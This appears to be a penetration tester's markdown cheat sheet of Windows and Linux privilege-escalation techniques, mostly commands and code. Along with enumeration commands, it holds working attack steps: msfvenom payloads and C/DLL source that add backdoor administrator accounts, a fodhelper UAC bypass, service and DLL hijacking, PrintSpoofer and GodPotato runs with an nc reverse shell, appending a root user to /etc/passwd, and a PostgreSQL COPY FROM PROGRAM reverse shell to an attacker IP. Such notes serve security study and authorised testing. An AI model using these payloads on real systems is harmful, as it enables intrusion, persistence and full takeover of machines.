### Users , Groups , Permissions
"Everyone" vs. "BUILTIN\Users":
>"Everyone" includes all users and groups, both authenticated and unauthenticated, on the system. This is an extremely permissive group, and it encompasses a wider range of potential users and entities.

>"BUILTIN\Users," on the other hand, includes only the user accounts that have been created on the local system. This group typically doesn't include unauthenticated users and doesn't include accounts from trusted domains or external sources.
### Windows
###### AutoEnumeration
winpeas.exe
###### find service with filename
```
wmic service get name,pathname |  findstr /i "backup.exe"
```
###### Check which user runns this service
```
Get-Service -Name "RasMan" | Select-Object Name, Status, DisplayName, UserName
sc qc <service_name>
```
###### Check which exe file using specific dll
```
tasklist /m dllname
tasklist /m (list all process using which dlls)
```

###### list relationship between Processes and Services (Windows can't list processes run by privileged users)
```
tasklist /svc
tasklist /svc /fi "imagename eq your_file.exe"
```
###### Service Actions
```
Start-Service -Name ""
Stop-Service -Name ""
sc stop servicename
```

###### Powershell history
```
(Get-PSReadlineOption).HistorySavePath
```

###### Firewall
```
netsh advfirewall show currentprofile  
netsh advfirewall show allprofile  
netsh advfirewall firewall show rule name=all
```

###### Scheduled Tasks
```
schtasks /query /fo LIST /v
schtasks /query /v /fo list | findstr /i "backup.exe"
schtasks /query /fo LIST /v /tn "backup runner(taskname)" ----for retrieve full task info
Get-ScheduledTask | Where-Object {$_.TaskName -like '*backup*'}
```

###### Enumerating Unmounted Disks
```
mountvol
```

###### Enumerating Device Drivers and Kernel Modules
```
1. driverquery /v /FO Table  
2. Get-WmiObject Win32_PnPSignedDriver | Select-Object DeviceName, DriverVersion, Manufacturer
```

###### Enumerating Binaries That AutoElevate
```
reg query HKEY_CURRENT_USER\Software\Policies\Microsoft\Windows\Installer  
reg query HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\Installer
$ msfvenom -p windows/adduser USER=backdoor PASS=backdoor123 -f msi -o evil.msi
$ msfvenom -p windows/adduser USER=backdoor PASS=backdoor123 -f msi-nouac -o evil.msi
$ msiexec /quiet /qn /i C:\evil.msi
```

###### Bypass UAC
```
1. check C:\Windows\System32\fodhelper.exe
2. REG ADD HKCU\Software\Classes\ms-settings\Shell\Open\command
3. REG ADD HKCU\Software\Classes\ms-settings\Shell\Open\command /v DelegateExecute /t REG_SZ
4. REG ADD HKCU\Software\Classes\ms-settings\Shell\Open\command /d "cmd.exe" /f
5. run fodhelper.exe, whoami /groups
```

```
use exploit/windows/local/bypassuac_eventvwr
set session 1
set target 1(x64,0=x86)
Note to set payload the same arch with session 1's payload，set lhost and lport same with session 1
```

###### Insecure File Permissions
```
1. Get-WmiObject win32_service | Select-Object Name, State, PathName | Where-Object {$_.State -like 'Running'} # look for services with path in Program Files
2. icacls "service path" # check if current user has permission to replace file with malicious one
3. replace malicious exe with service executable
4. Get-WmiObject -Class Win32_Service -Property StartMode -Filter "Name='Service Name'" 
5. whoami /priv #check out shutdown privileges of user
```

###### Unquoted Service Paths
To list all unquoted service paths (minus built-in Windows services)
```
wmic service get name,pathname |  findstr /i /v "C:\Windows\\" | findstr /i /v """
wmic service get name,displayname,pathname,startmode |findstr /i "Auto" | findstr /i /v "C:\Windows\\" |findstr /i /v """
wmic service get name,displayname,pathname,startmode | findstr /i /v "C:\\Windows\\system32\\" |findstr /i /v """ #Not only auto services
```

```
Service Path:
C:\Program Files\My Program\My Service\service.exe
The Service will run the executable in path like this:
C:\Program.exe
C:\Program Files\My.exe
C:\Program Files\My Program\My.exe
C:\Program Files\My Program\My service\service.exe

1. check if current user has permission to place malicious bianry into subdirectories of unquoted service path
2. check which service runs this executable file
3. restart the service to receive rev shell or msfvenom -p windows/exec CMD="net localgroup administrators username /add" -f exe-service -o service.exe
```

Automatic Script:
```
cp /usr/share/windows-resources/powersploit/Privesc/PowerUp.ps1 .
Import-Module .\PowerUp.ps1
Get-UnquotedService
```

###### Service Binary Hijacking
```
Get-CimInstance -ClassName win32_service | Select Name,State,PathName | Where-Object {$_.State -like 'Running'}

adduser.c:
#include <stdlib.h>

int main ()
{
  int i;
  
  i = system ("net user dave2 password123! /add");
  i = system ("net localgroup administrators dave2 /add");
  
  return 0;
}

x86_64-w64-mingw32-gcc adduser.c -o adduser.exe
iwr -uri http://192.168.119.3/adduser.exe -Outfile adduser.exe
move C:\xampp\mysql\bin\mysqld.exe mysqld.exe
move .\adduser.exe C:\xampp\mysql\bin\mysqld.exe

Get-CimInstance -ClassName win32_service | Select Name, StartMode | Where-Object {$_.Name -like 'mysql'}
whoami /priv(if SeShutdownPrivilege isn't present,  we would have to wait for the victim to manually start the service)
shutdown /r /t 0

Automatic Script:
cp /usr/share/windows-resources/powersploit/Privesc/PowerUp.ps1 .
Import-Module .\PowerUp.ps1
Get-ModifiableServiceFile
```

###### Service DLL Hijacking
standard search order taken from the Microsoft Documentation
When safe DLL search mode is disabled, the current directory is searched at position 2 after the application's directory
```
1. The directory from which the application loaded.
2. The system directory.
3. The 16-bit system directory.
4. The Windows directory. 
5. The current directory.
6. The directories that are listed in the PATH environment variable.
```

```
1. Get-CimInstance -ClassName win32_service | Select Name,State,PathName | Where-Object {$_.State -like 'Running'}
2. Use Procmon64.exe(Process Monitor)(require admin privilege)(Bypass: copy the file to local, then use Procmon64.exe)
3. Checked for loaded dlls or missing dlls
4. replace dll with malicious file
5. PS: Restart-Service BetaService
```

Each DLL can have an optional entry point function named DllMain, which is executed when processes or threads attach the DLL  
This function generally contains four cases named DLL_PROCESS_ATTACH, DLL_THREAD_ATTACH, DLL_THREAD_DETACH, DLL_PROCESS_DETACH
```
#include <stdlib.h>
#include <windows.h> //appened code

BOOL APIENTRY DllMain(
HANDLE hModule,// Handle to DLL module
DWORD ul_reason_for_call,// Reason for calling function
LPVOID lpReserved ) // Reserved
{
    switch ( ul_reason_for_call )
    {
        case DLL_PROCESS_ATTACH: // A process is loading the DLL.
        int i;
  	    i = system ("net user dave2 password123! /add"); //appened code
  	    i = system ("net localgroup administrators dave2 /add"); //appened code
        break;
        case DLL_THREAD_ATTACH: // A process is creating a new thread.
        break;
        case DLL_THREAD_DETACH: // A thread exits normally.
        break;
        case DLL_PROCESS_DETACH: // A process unloads the DLL.
        break;
    }
    return TRUE;
}
```

Cross-compile
```
x86_64-w64-mingw32-gcc myDLL.cpp --shared -o myDLL.dll
```

Replace and restart service
```
iwr -uri http://192.168.119.3/myDLL.dll -Outfile myDLL.dll
Restart-Service BetaService
```

###### Scheduled Tasks
```
Get-ScheduledTask
schtasks /query /fo LIST /v
icacls C:\Users\steve\Pictures\BackendCacheCleanup.exe
iwr -Uri http://192.168.119.3/adduser.exe -Outfile BackendCacheCleanup.exe
move .\Pictures\BackendCacheCleanup.exe BackendCacheCleanup.exe.bak
move .\BackendCacheCleanup.exe .\Pictures\
```

###### Named Pipes(PrintSpoofer)
```
Requirements: SeImpersonatePrivilege has to be enabled
Download address: wget https://github.com/itm4n/PrintSpoofer/releases/download/v1.0/PrintSpoofer64.exe
kali: iwr -uri http://192.168.45.214/PrintSpoofer64.exe -Outfile PrintSpoofer64.exe
victim: .\PrintSpoofer64.exe -i -c powershell.exe(cmd.exe)\

whoami
```
###### Godpotato
```
GodPotato-NET4.exe
GodPotato -cmd "cmd /c whoami"
GodPotato -cmd "nc -t -e C:\Windows\System32\cmd.exe 192.168.1.102 2012"

Affected version:
Windows Server 2012 - Windows Server 2022 Windows8 - Windows 11
```
###### PowerUp.ps1
```
Service Enumeration:
Get-ServiceUnquoted                 -   returns services with unquoted paths that also have a space in the name
Get-ModifiableServiceFile           -   returns services where the current user can write to the service binary path or its config
Get-ModifiableService               -   returns services the current user can modify
Get-ServiceDetail                   -   returns detailed information about a specified service
Service Abuse:
Invoke-ServiceAbuse                 -   modifies a vulnerable service to create a local admin or execute a custom command
Write-ServiceBinary                 -   writes out a patched C# service binary that adds a local admin or executes commands
Install-ServiceBinary               -   replaces a service binary with one that adds a local admin or executes commands
Restore-ServiceBinary               -   restores a replaced service binary with the original executable
DLL Hijacking:
Find-ProcessDLLHijack               -   finds potential DLL hijacking opportunities for currently running processes
Find-PathDLLHijack                  -   finds service %PATH% DLL hijacking opportunities
Write-HijackDll                     -   writes out a hijackable DLL
Registry Checks:
Get-RegistryAlwaysInstallElevated   -  checks if the AlwaysInstallElevated registry key is set
Get-RegistryAutoLogon               -   checks for Autologon credentials in the registry
Get-ModifiableRegistryAutoRun       -   checks for any modifiable binaries/scripts (or their configs) in HKLM autoruns
Miscellaneous Checks:
Get-ModifiableScheduledTaskFile     -   find schtasks with modifiable target files
Get-UnattendedInstallFile           -   finds remaining unattended installation files
Get-Webconfig                       -   checks for any encrypted web.config strings
Get-ApplicationHost                 -   checks for encrypted application pool and virtual directory passwords
Get-SiteListPassword                -   retrieves the plaintext passwords for any found McAfee's SiteList.xml files
Get-CachedGPPPassword               -   checks for passwords in cached Group Policy Preferences files
Other Helpers/Meta-Functions:
Get-ModifiablePath                  -   tokenizes an input string and returns the files in it the current user can modify
Get-CurrentUserTokenGroupSid        -   returns all SIDs that the current user is a part of, whether they are disabled or not
Add-ServiceDacl                     -   adds a Dacl field to a service object returned by Get-Service
Set-ServiceBinPath                  -   sets the binary path for a service to a specified value through Win32 API methods
Test-ServiceDaclPermission          -   tests one or more passed services or service names against a given permission set
Write-UserAddMSI                    -   write out a MSI installer that prompts for a user to be added
Invoke-AllChecks                    -   runs all current escalation checks and returns a report
```

### Linux
###### AutoEnumeration
linpeas.sh
###### Nday exploits
```
CVE-2021-3156 sudo Baron Samedit 2 sudo 1.8.2-1.8.32,1.9.0-1.9.5 downloadlink:https://codeload.github.com/worawit/CVE-2021-3156/zip/main
```
###### Kernel exploits
```
OS version:
cat /etc/issue  
cat /etc/*-release  
Kernel Version and Architecture: 
uname -a
```
###### GTFOBins
```
GTFOBins is a curated list of Unix binaries that can be used to bypass local security restrictions in misconfigured systems.
```
###### Editor PE
vim, less
```
inside vim or less, after colon(:), execute !/bin/sh
```

###### Processes(Linux can list processes run by privileged users)
ps aux
###### Pspy - Unprivileged Linux Process Snooping
Pspy is a command line tool designed to snoop on processes without need for root permissions. It allows you to see commands run by other users, cron jobs, etc. as they execute. Great for enumeration of Linux systems in CTFs. Also great to demonstrate your colleagues why passing secrets as arguments on the command line is a bad idea.

###### Enumerating Readable/Writable Files and Directories
find / -writable(-readable,-executable) -type d(f) 2>/dev/null  
###### Enumerating Unmounted Disks
mount  
lsblk
###### Enumerating Device Drivers and Kernel Modules
1. lsmod  
2. /sbin/modinfo libata
###### SUID permissions
find / -perm -u=s -type f 2>/dev/null
```
find with suid perm:

touch raj
find raj -exec "whoami" \;
```

```
cp with suid perm:

cd /tmp
wget //192.168.1.108/passwd(get new /etc/passwd under /tmp)
cp passwd /etc/passwd

msfvenom -p cmd/unix/reverse_netcat lhost=192.168.1.108 lport=1234 R
cp raj.sh /etc/cron.hourly/
ls -al /etc/cron.hourly/
```

```
vim.basic with suid:

vim.basic /etc/passwd
```

```
/sbin/capsh with suid:
/sbin/capsh --gid=0 --uid=0 --
```

 ###### Cronjob to elevate privilege
 leverage the cron jobs run by root but current user can edit it to elevate privilege
 ```
 1. Show Cronjobs logs:
grep "CRON" /var/log/cron.log
Jan27 18:00:01 victim CRON[2671]:(root) CMD (cd /var/scripts/ && ./user_backups.sh)

2. To display contents of the root user’s crontab:
less /etc/crontab

3. View Cron Jobs by User:
sudo crontab -u [username] -l

4. List Hourly/daily/weekly/monthly Cron Jobs:
ls -la /etc/cron.hourly

5. To view software specefic cron tasks:
cd /etc/cron/daily
ls -l

6. To list all scheduled cron jobs for the current user:
crontab -l

7. Cron jobs are typically located in the spool directories.
They are stored in tables called crontabs.
You can find them in /var/spool/cron/crontabs
 ```
###### Insecure file permission /etc/passwd
 ```
 1. check if users have write permission
 2. openssl passwd evil:
 $1$eWmYOQrX$UHeqHr4pKVFfx1rrFK05B1
openssl passwd -1 -salt hack password123
 3. echo "root2:$1$eWmYOQrX$UHeqHr4pKVFfx1rrFK05B1:0:0:root:/root:/bin/bash" >> /etc/passwd
 4. su root2, enter passwd as evil
 ```
###### Postgresql to RCE
```
To run system commands on Linux or Windows, we need to use the PROGRAM parameter. We start with creating a table; we can name — shell.

pg_read_server_files — allow reading files
pg_write_server_files — allow writing to files
pg_execute_server_program — allow executing commands directly into the operating system.

GRANT pg_execute_server_program TO username;
GRANT pg_read_server_files TO username;
GRANT pg_write_server_files TO username;


command execution:
CREATE TABLE shell(output text);
COPY shell FROM PROGRAM 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.45.226 1234 >/tmp/f';
```
